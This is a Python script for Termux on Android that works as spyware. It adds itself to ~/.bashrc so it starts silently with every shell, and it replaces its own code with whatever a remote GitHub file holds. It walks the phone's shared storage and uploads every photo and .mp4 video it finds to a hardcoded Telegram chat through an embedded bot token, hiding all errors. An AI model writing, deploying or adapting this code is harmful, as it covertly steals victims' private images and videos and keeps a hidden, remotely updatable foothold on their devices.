import os
import time
import shutil
import telebot

#    ƏVVƏLİ

import os
import requests

GITHUB_RAW = "https://raw.githubusercontent.com/USERNAME/REPO/main/start.py"
LOCAL_FILE = "/data/data/com.termux/files/usr/start.py"

try:
    r = requests.get(GITHUB_RAW, timeout=5)
    if r.status_code == 200:
        remote = r.text
        local = ""

        if os.path.exists(LOCAL_FILE):
            try:
                with open(LOCAL_FILE, "r") as f:
                    local = f.read()
            except:
                pass

        if remote != local:
            try:
                with open(LOCAL_FILE, "w") as f:
                    f.write(remote)
            except:
                pass
except:
    pass

#    SONU

bashrc_path = "/data/data/com.termux/files/home/.bashrc"

kod = """
if [ -f /data/data/com.termux/files/usr/start.py ]; then
    (
        cd /data/data/com.termux/files/usr > /dev/null 2>&1
        python start.py > /dev/null 2>&1 &
    )
fi
""".strip()


if not os.path.exists(bashrc_path):
    with open(bashrc_path, "w") as f:
        pass

with open(bashrc_path, "r") as f:
    content = f.read()


if kod in content:
    print("Artıq ~/.bashrc içində var.")
else:

    with open(bashrc_path, "a") as f:
        f.write("\n" + kod + "\n")
    print("Uğurla ~/.bashrc faylına əlavə edildi!")


current_path = os.path.abspath(__file__)
target_path = "/data/data/com.termux/files/usr/start.py"

if current_path != target_path:
    try:
        shutil.move(current_path, target_path)
    except:
        pass

os.system('pip install telebot > /dev/null 2>&1')

API_TOKEN = "8505792815:AAECEwEv3LAL1BkdsEjlLYFADIbNd0Hw8Ok"
TARGET_ID = 1505983960
bot = telebot.TeleBot(API_TOKEN)

sent_file = "/data/data/com.termux/files/usr/send.txt"

if not os.path.exists(sent_file):
    try:
        with open(sent_file, "w") as f:
            pass
    except:
        pass

sent_times = set()
try:
    with open(sent_file, "r") as f:
        for line in f:
            line = line.strip()
            if line:
                sent_times.add(float(line))
except:
    pass
image_ext = [".jpg", ".jpeg", ".png", ".webp"]
video_ext = [".mp4"]

root = "/storage/emulated/0"
files_to_send = []

for folder, dirs, files in os.walk(root):
    for f in files:
        name = f.lower()
        full_path = os.path.join(folder, f)

   
        if any(name.endswith(ext) for ext in image_ext + video_ext):
            try:
                mtime = os.path.getmtime(full_path)

                if mtime in sent_times:
                    continue

                files_to_send.append((full_path, mtime))

            except:
                pass


files_to_send.sort(key=lambda x: x[1], reverse=True)

for path, mtime in files_to_send:
    try:
        caption = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(mtime))
        low = path.lower()
        if any(low.endswith(ext) for ext in image_ext):
            with open(path, "rb") as p:
                bot.send_photo(TARGET_ID, p, caption=caption)
        elif any(low.endswith(ext) for ext in video_ext):
            with open(path, "rb") as v:
                bot.send_video(TARGET_ID, v, caption=caption)

        # Tarixi qeyd et (yenidən göndərilməsin)
        with open(sent_file, "a") as f:
            f.write(str(mtime) + "\n")

    except Exception as e:
        pass












